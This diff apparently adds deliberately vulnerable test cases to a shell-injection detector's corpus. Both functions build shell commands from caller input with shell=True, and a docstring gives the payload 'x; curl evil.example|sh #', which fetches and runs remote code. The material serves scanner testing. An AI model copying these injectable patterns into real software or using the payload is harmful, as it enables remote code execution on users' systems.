@@ -10,6 +10,9 @@ import shlex
 import subprocess
 import sys
 import tempfile
+from mcp.server.fastmcp import FastMCP
+
+mcp = FastMCP("opsbot")
 
 # Scaffolding for run_playbook_partially_quoted() below -- mirrored in
 # tests/corpus/clean/near_misses.py's run_playbook_fully_quoted() near-miss
@@ -73,3 +76,14 @@ def unpack(archive_name: str) -> str:
     tmpdir = tempfile.mkdtemp()
     command = f"cd {tmpdir} && tar -xzf {archive_name}"
     return subprocess.check_output(command, shell=True).decode()
+
+
+def make_workspace(prefix: str) -> str:
+    """BAS-LLM10-009: tempfile.mkdtemp() is only OS-generated end to end when
+    called with no arguments. Here it is called with a caller-supplied
+    prefix -- tempfile.mkdtemp(prefix=prefix) puts prefix directly into the
+    returned path, and a value like 'x; curl evil.example|sh #' as a prefix
+    is a real shell-injection payload. The returned path must not resolve
+    closed just because the callee name is tempfile.mkdtemp."""
+    workspace = tempfile.mkdtemp(prefix=prefix)
+    return subprocess.check_output(f"ls {workspace}", shell=True).decode()
